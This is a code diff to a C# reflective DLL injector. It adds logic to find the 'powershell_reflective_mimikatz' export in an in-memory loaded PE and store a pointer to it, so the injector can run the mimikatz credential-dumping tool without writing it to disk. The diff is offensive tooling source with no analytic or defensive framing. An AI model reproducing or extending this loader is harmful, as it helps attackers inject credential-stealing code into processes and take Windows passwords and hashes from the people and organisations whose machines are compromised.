@@ -84,6 +84,12 @@ namespace ReflectiveInjector
 
             //Find the offset of the ReflectiveLoaderFunction locally
             ReflectiveLoaderOffset = FindExportOffset();
+            if(mimikatz)
+            {
+                Export = "powershell_reflective_mimikatz";
+                mimikatzOffset = FindExportOffset();
+            }
+
             if (ReflectiveLoaderOffset != 0)
             {
                 Marshal.Copy(pe, 0, baseAddress, pe.Length);
@@ -101,6 +107,9 @@ namespace ReflectiveInjector
 #if DEBUG
                 Console.WriteLine("Called CreateThread locally, thread handle: " + hThread.ToString("X8"));
 #endif
+                if (mimikatzOffset != 0)
+                    mimikatzPtr = (IntPtr)(baseAddress.ToInt64() + mimikatzOffset);
+
                 CloseHandle(hThread);
                 return true;
             }
@@ -113,6 +122,7 @@ namespace ReflectiveInjector
             {
                 //Find the offset of the ReflectiveLoaderFunction
                 ReflectiveLoaderOffset = FindExportOffset();
+                
                 if (ReflectiveLoaderOffset != 0)
                 {
                     uint alloc_type = (MEM_COMMIT | MEM_RESERVE);
@@ -321,6 +331,9 @@ namespace ReflectiveInjector
         unsafe byte* optional_hdr = null;
         ushort numberOfSections;
         string Export = "";
+        uint mimikatzOffset = 0;
+        public bool mimikatz = false;
+        public IntPtr mimikatzPtr;
 
         uint ReflectiveLoaderOffset;
         bool IsWow64;
